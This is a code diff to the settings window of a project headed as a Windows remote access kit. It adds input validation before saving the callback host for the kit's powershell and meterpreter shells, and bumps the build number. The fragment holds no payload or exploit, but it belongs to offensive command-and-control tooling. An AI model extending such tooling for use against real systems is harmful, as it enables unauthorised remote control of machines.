@@ -10,7 +10,7 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.1
+# Build:  1.0.2
 # -------------------------------------------------------------
 from PyQt5 import QtCore, QtGui, QtWidgets
 from ..logging.logging import ConsoleWindow,LoggingUtilitys
@@ -82,9 +82,15 @@ class Ui_settings_window(object):
     #Function will change the shell domain for powershell and meterpreter shells
     def change_host_domain(self):
         host = NicHandler().validate_host(self.host_combobox.currentText())#Get the current text from domain combo box
-        DNSconfigs().write_shell_domain(host)                #Write the domain to the shell config file
-        Notifications().raise_notification(f'Updated shell host to {host}','Success')   #Inform user
-        ConsoleWindow().log_to_console(f'Changed shell host to {host}')                 #Log event to console
+        if host == '':                                                     #If the host is an empty string,
+            ErrorHandling().raise_error('Could not update host IP/Domain',   #Raise an error
+                                      'Invalid host string',
+                                      'Host Error')
+            ConsoleWindow().log_to_console('Error updating client shell connection string') #Log to console
+        else:
+            DNSconfigs().write_shell_domain(host)                #Write the domain to the shell config file
+            Notifications().raise_notification(f'Updated shell host to {host}','Success')   #Inform user
+            ConsoleWindow().log_to_console(f'Changed shell host to {host}')                 #Log event to console
 
     #Function will change the network interface that the server operates on
     def change_network_interface(self):
